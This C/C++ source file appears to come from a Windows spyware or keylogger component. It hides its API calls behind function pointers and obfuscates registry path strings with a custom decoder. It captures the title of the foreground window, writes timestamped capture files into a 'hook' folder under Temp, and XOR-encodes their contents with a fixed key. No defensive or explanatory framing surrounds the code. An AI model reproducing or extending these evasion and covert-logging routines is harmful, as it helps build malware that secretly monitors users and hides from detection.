int Utf82Gb(const char * p, int len, char * buf, int buflen)
{
	unsigned short temp_str[1000];
	int len2;
	int len3;
	
	if(len >= 500)
		return 0;
	
	memset(temp_str, 0, sizeof(temp_str));
	memset(buf, 0, buflen);
	
	len2 = PMultiByteToWideChar(CP_UTF8, 0, p, len, temp_str, 1000); //UTF8=>Unicode
	len3 = PWideCharToMultiByte(CP_ACP, 0, temp_str, len2, buf, buflen, NULL, NULL);
	
	return len3;
}

int Gb2Utf8(const char * p, int len, char * buf, int buflen)
{
	unsigned short temp_str[1000];
	int len2;
	int len3;
	
	if(len >= 500)
		return 0;
	
	memset(temp_str, 0, sizeof(temp_str));
	memset(buf, 0, buflen);

	len2 = PMultiByteToWideChar(CP_ACP, 0, (LPCSTR)p, len, temp_str, 1000);
	len3 = PWideCharToMultiByte(CP_UTF8, 0, temp_str, len2, buf, buflen, NULL, NULL);
	
	return len3;
}

int LineParser2(char * inputline,char ** nextline,char **field,char ** value){
	//
	*nextline=strstr(inputline,"||");
	if(*nextline!=NULL){
		**nextline=0;
		*nextline+=2;
	}
	else
		return 0;
	//
	*value=strstr(inputline,": ");
	if(*value!=NULL){
		**value=0;
		*value+=2;
	}
	else
		return 0;
	*field=inputline;
	if(memcmp(*nextline,"||",2)==0){
		**nextline=0;
		*nextline+=2;
		return 2;
	}
	else
		return 1;
}



BOOL myGetModuleFile(WCHAR * SelfPath, DWORD PathLen, WCHAR * SelfName, DWORD NameLen)
{
	WCHAR TmpPath[MAX_PATH];
	memset(TmpPath, 0, 2*MAX_PATH);
	PGetModuleFileNameW(NULL, TmpPath, PathLen);
	if (PathLen > 0)
	{
		WCHAR * pos = wcsrchr(TmpPath, L'\\');
		if (pos == NULL)
			return FALSE;
		if (pos[1] == 0)
			return FALSE;
		
		wcscpy(SelfName, pos+1);
		NameLen = wcslen(SelfName);
		pos[1] = 0;
		wcscpy(SelfPath, TmpPath);
		PathLen = wcslen(SelfPath);
		
		return TRUE;
	}
	
	return FALSE;
}

void *mymemcpy(void *des, const void *src, size_t len)
{
	char * result = (char *)des;
	const char * from = (const char *)src;
	assert(des&&src);
	while(len--)
	{   
		*(result++) = *(from++);
	}   
	return des;
}

// void Split(const char* buf, int len, char* e, vector<string>& parray)
// {
// 	char * tp = new char[len+1];
// 	memcpy(tp, buf, len);
// 	int splitword = strlen(e);
// 	
// 	char * p = strstr(tp, e);
// 	while(p != NULL)
// 	{
// 		*p = 0;
// 		parray.push_back(tp);
// 		
// 		tp=p+splitword;
// 		p=strstr(tp,e);
// 	}
// 	if(len>0)
// 	{
// 		parray.push_back(tp);
// 	}
// }

bool Split(const char* buf, int len, char* e, vector<string>& parray, bool bLastField)
{
	if (len >0)
	{
		int slen = strlen(e);
		int buflen = len;
		bool bLastEmpty = true;
		
		char * data = new char[len+1];
		memcpy(data, buf, len);
		data[len] = 0;
		char * p = data;
		
		do 
		{
			if (buflen == 0)
			{
				break;
			}
			
			if (slen > buflen)
			{
				parray.push_back(p);
			}
			
			char *s = strstr(p, e);
			if (s)
			{
				s[0] = 0;
				parray.push_back(p);
				buflen -= (s-p);
				buflen -= slen;
				p=s+slen;
			}
			else
			{
				parray.push_back(p);
				bLastEmpty = false;
				break;
			}
			
		} while (p);
		
		if (bLastField && bLastEmpty)
		{
			parray.push_back("");
		}
		
		delete data;
	}
	
	return true;
}   

void Split(char* buf,int len,char* e,Para * parray,int& count)
{
	int arraycount=count;
	count=0;
	char * tp=buf;
	int splitword=strlen(e);
	
	char * p=strstr(buf,e);
	while(p!=NULL)
	{
		*p = 0;
		char* pp=tp;
		int off=p-tp;
		parray[count].value=tp;
		parray[count].len=off;
		count++;
		if(count>=arraycount)
			return ;
		tp=p+splitword;
		len-=(off+splitword);
		p=strstr(tp,e);
	}
	if(len>0)
	{
		parray[count].value=tp;
		parray[count].len=len;
		count++;
	}
}

BOOL CreateFileName(LPCSTR m_type, LPSTR filename, LPSTR filea)
{
	char flgTempPath[MAX_PATH];
	memset(flgTempPath, 0, MAX_PATH);
	DWORD l = PGetTempPathA(MAX_PATH, flgTempPath);	
	
	char hookdir[MAX_PATH];
	memset(hookdir, 0, MAX_PATH);
	sprintf(hookdir, "%s%s", flgTempPath, m_type);
	if(_access(hookdir, 0) != 0)
	{
		_mkdir(hookdir);
	}
	
	memset(filename, 0, MAX_PATH);
	memset(filea, 0, MAX_PATH);
	
	SYSTEMTIME nowtime;
	PGetLocalTime(&nowtime);

	static int irand = 0;
	irand++;
	if (irand == 10000)
	{
		irand = 0;
	}
	
	sprintf(filename, "%s\\%04d%02d%02d%02d%02d%02d_%u.t", hookdir,
		nowtime.wYear, nowtime.wMonth, nowtime.wDay, nowtime.wHour, nowtime.wMinute, nowtime.wSecond,
		irand);
	sprintf(filea, "%s\\%04d%02d%02d%02d%02d%02d_%u.a", hookdir,
		nowtime.wYear, nowtime.wMonth, nowtime.wDay, nowtime.wHour, nowtime.wMinute, nowtime.wSecond,
		irand);
	
	return TRUE;
}

BOOL myWriteFile(char *buf, int buflen, LPSTR browserfilename, LPSTR browserfilea)
{
	HANDLE m_hFile = PCreateFileA(browserfilename, 
		GENERIC_WRITE, 
		0, 
		NULL,
		CREATE_ALWAYS, 
		FILE_ATTRIBUTE_NORMAL        // normal file 
		,NULL);
	if (m_hFile==NULL || m_hFile==INVALID_HANDLE_VALUE)
	{
		m_hFile=NULL;
		return FALSE;
	}
	
	if(m_hFile)
	{
		WriteCyFile(m_hFile, buf, buflen);
		CloseHandle(m_hFile);
		
		int result = rename(browserfilename, browserfilea);
		if( result != 0 )
		{
			return FALSE;
		}
	}
	
	return TRUE;
}

char* g_key="\x59\x59\x59\x59";
BOOL Decode2(char*buf, DWORD& len)
{
	int keycount=0;
	for(DWORD i=0;i<len;i++)	
	{
		if(keycount==4)
			keycount=0;
		char *p;
		p=buf+i;
		char kk=g_key[keycount];
		*p=*p^kk;
		keycount++;
	}
	return TRUE;
}

BOOL WriteCyFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
{
	Decode2((char*)lpBuffer, nNumberOfBytesToWrite);
	
	DWORD outWrite;
	PWriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &outWrite, NULL);
	if(outWrite == nNumberOfBytesToWrite)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WriteCyFile(LPCSTR filename, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
{
	HANDLE hFile = PCreateFileA(filename,
		GENERIC_WRITE, 
		0, 
		NULL,
		CREATE_ALWAYS, 
		FILE_ATTRIBUTE_NORMAL,        // normal file 
		NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	
	Decode2((char*)lpBuffer, nNumberOfBytesToWrite);
	
	DWORD outWrite;
	PWriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &outWrite, NULL);
	CloseHandle(hFile);
	if(outWrite == nNumberOfBytesToWrite)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

char * GetUtf8WindowTitle()
{
	WCHAR lpWindowTitle[MAX_PATH];
	HWND hWindow = PGetForegroundWindow();
	
	memset(lpWindowTitle, 0, sizeof(lpWindowTitle));
	PGetWindowTextW(hWindow, lpWindowTitle, MAX_PATH-1);

	static char * WindowTitle = new char[3*MAX_PATH];
	Unicode2UTF_8(lpWindowTitle, WindowTitle, 3*MAX_PATH);

	return WindowTitle;
}

BOOL GetAppDataPath(char *path)
{
	if(path==NULL)	//参数错误
		return FALSE;
	
	memset(path,0,MAX_PATH);
	char TmpDecodeStr[100];
	unsigned char tmp[2*MAX_PATH+10];
	HKEY hkey;
	unsigned long type;
	long res;
	unsigned long len;
	
	//SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders
	if(PRegOpenKeyExA(HKEY_CURRENT_USER,
		DepubStringA(TmpDecodeStr, 100, "AIt-NPWi\\.yGok2kle\\Nyx:kL2\\8aoowxe6wo2ykx\\izXdkowo\\AZwdd tkd:wo2"),
		0,
		KEY_QUERY_VALUE,
		&hkey)!=ERROR_SUCCESS)	//打开键失败
	{
		return FALSE;
	}
	
	len=2*MAX_PATH+10-1;
	res=PRegQueryValueExA(hkey, DepubStringA(TmpDecodeStr, 100, "PXXfVeV"), 0, &type, tmp, &len); //AppData
	
	PRegCloseKey(hkey);
	
	if(res!=ERROR_SUCCESS||type!=REG_SZ)	//查询键值失败,或者值类型不是字符串
		return FALSE;
	
	strcpy(path,(const char *)tmp);
	
	return TRUE;
}


BOOL GetLocalAppDataPath(char *path)
{
	if(path==NULL)	//参数错误
		return FALSE;
	
	memset(path,0,MAX_PATH);
	char TmpDecodeStr[100];
	unsigned char tmp[2*MAX_PATH+10];
	HKEY hkey;
	unsigned long type;
	long res;
	unsigned long len;
	
	//SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders
	if(PRegOpenKeyExA(HKEY_CURRENT_USER,
		DepubStringA(TmpDecodeStr, 100, "AIt-NPWi\\.yGok2kle\\Nyx:kL2\\8aoowxe6wo2ykx\\izXdkowo\\AZwdd tkd:wo2"),
		0,
		KEY_QUERY_VALUE,
		&hkey)!=ERROR_SUCCESS)	//打开键失败
	{
		return FALSE;
	}
	
	len=2*MAX_PATH+10-1;
	res=PRegQueryValueExA(hkey, DepubStringA(TmpDecodeStr, 100, "SkGVd PXXfVeV"), 0, &type, tmp, &len);//Local AppData
	
	PRegCloseKey(hkey);
	
	if(res!=ERROR_SUCCESS||type!=REG_SZ)	//查询键值失败,或者值类型不是字符串
		return FALSE;
	
	strcpy(path,(const char *)tmp);
	
	return TRUE;
}

void WriteDbgLogEx(const char *fm, ...)
{
	int buflen = 5100;
	char *buf = new char[buflen];
	memset(buf, 0, buflen);
	va_list args;
	va_start(args, fm);
	int isize = _vsnprintf(buf, buflen, fm, args);
	va_end(args);
	
	FILE *fp = fopen("debug.txt", "ab+");
	if (fp)
	{
		fwrite(buf, 1, isize, fp);
		fclose(fp);
	}
	
	delete []buf;
	return ;
}